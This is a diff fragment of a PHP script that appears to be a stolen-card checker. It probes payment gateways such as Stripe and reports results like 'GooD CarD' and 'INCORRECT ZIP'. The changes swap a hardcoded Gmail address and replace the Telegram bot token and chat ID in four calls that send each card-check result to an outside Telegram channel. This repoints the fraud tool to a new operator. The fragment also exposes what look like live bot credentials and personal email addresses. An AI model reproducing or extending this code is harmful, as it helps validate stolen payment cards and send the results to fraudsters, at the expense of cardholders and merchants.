@@ -208,7 +208,7 @@ $lastname = find_between($resposta, '"last":"', '"');
 // $email = str_replace("example.com", $serv_rnd, $email);
 
 // Set your own email directly
-$email = "amanpandey125aman@gmail.com"; // Replace with your actual email
+$email = "itzdragon001@gmail.com"; // Replace with your actual email
 
 function getMinimumPriceProductDetails(string $json): array {
     $data = json_decode($json, true);
@@ -1930,7 +1930,7 @@ $log_message = "<b>GooD CarD 🔥</b>\n" .
 "<b>Gateway:</b> $gateway\n" .
 "<b>Amount:</b> $totalamt$\n" .
 "<b>Time:</b> {$time_taken}s</pre>";
-send_telegram_log("7549396658:AAGCZd32dGBEfovEcr6fvSXnIJj-Bb4Uvms", "-1002686855701", $log_message);
+send_telegram_log("7766047913:AAGiFcvp0lExMd_4tZWMj2YjllFWXL7Pzg8", "-1002207214810", $log_message);
 $result = json_encode([
 'Response' => $err,
 'Price' => $totalamt,
@@ -1948,7 +1948,7 @@ $log_message = "<b>CompletePaymentChallenge ⚠️</b>\n" .
 "<b>Gateway:</b> $gateway\n" .
 "<b>Amount:</b> $totalamt$\n" .
 "<b>Time:</b> {$time_taken}s</pre>";
-send_telegram_log("7549396658:AAGCZd32dGBEfovEcr6fvSXnIJj-Bb4Uvms", "-1002686855701", $log_message);
+send_telegram_log("7766047913:AAGiFcvp0lExMd_4tZWMj2YjllFWXL7Pzg8", "-1002207214810", $log_message);
 $result_data = [
 'Response' => $err,
 'Price' => $totalamt,
@@ -1966,7 +1966,7 @@ $log_message = "<b>stripeauthentications ⚠️</b>\n" .
 "<b>Gateway:</b> $gateway\n" .
 "<b>Amount:</b> $totalamt$\n" .
 "<b>Time:</b> {$time_taken}s</pre>";
-send_telegram_log("7549396658:AAGCZd32dGBEfovEcr6fvSXnIJj-Bb4Uvms", "-1002686855701", $log_message);
+send_telegram_log("7766047913:AAGiFcvp0lExMd_4tZWMj2YjllFWXL7Pzg8", "-1002207214810", $log_message);
 $result_data = [
 'Response' => $err,
 'Price' => $totalamt,
@@ -1988,7 +1988,7 @@ $log_message = "<b>INCORRECT ZIP ❌</b>\n" .
 "<b>Gateway:</b> $gateway\n" .
 "<b>Amount:</b> $totalamt$\n" .
 "<b>Time:</b> {$time_taken}s</pre>";
-send_telegram_log("7549396658:AAGCZd32dGBEfovEcr6fvSXnIJj-Bb4Uvms", "-1002686855701", $log_message);
+send_telegram_log("7766047913:AAGiFcvp0lExMd_4tZWMj2YjllFWXL7Pzg8", "-1002207214810", $log_message);
 }
 $result = json_encode([
 'Response' => $err,
